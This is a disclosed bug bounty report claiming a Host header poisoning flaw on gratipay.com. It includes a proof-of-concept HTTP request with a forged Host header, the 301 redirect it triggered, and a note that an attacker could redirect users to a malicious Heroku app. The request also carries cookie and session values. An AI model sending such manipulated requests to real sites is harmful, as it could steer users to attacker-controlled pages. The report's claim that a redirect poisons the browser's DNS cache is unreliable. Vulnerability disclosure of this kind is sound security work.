# Host Header poisoning on gratipay.com

## Report Details
- **Report ID**: 158482
- **URL**: https://hackerone.com/reports/158482
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-11T14:45:22.032Z
- **Disclosed**: 2017-08-21T13:32:31.677Z

## Reporter
- **Username**: aaron_costello
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gratipay

## Vulnerability Information
There is a host header poisoning vulnerability on gratipay.com that allows an attacker to cause a 301 redirect and poison the browser DNS cache to cause all further requests to gratipay.com to be redirected to the attacker's site.

PoC Request:
```
GET https://gratipay.com/ HTTP/1.1
Host: heroku.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: csrf_token=oglKUTprcTt6gQkxpCMEz6UAj0HXxgez; suppress-welcome=; session=eeee68e176604dc2bdb36d1766755ea0
Connection: keep-alive
```

Response:
```
HTTP/1.1 301 Moved Permanently
Server: Cowboy
Date: Thu, 11 Aug 2016 14:38:17 GMT
Connection: keep-alive
Strict-Transport-Security: max-age=31536000
Location: https://www.heroku.com/
Content-Type: text/html
Content-Length: 0
Via: 1.1 vegur
```

Things to note:
1. Tested on Firefox, Host header manipulated with the Live HTTP Headers and Tamper Data addons
2. The attacker must create a malicious Heroku app to redirect to, in the PoC i have just chosen heroku.com


## Attachments
No attachments
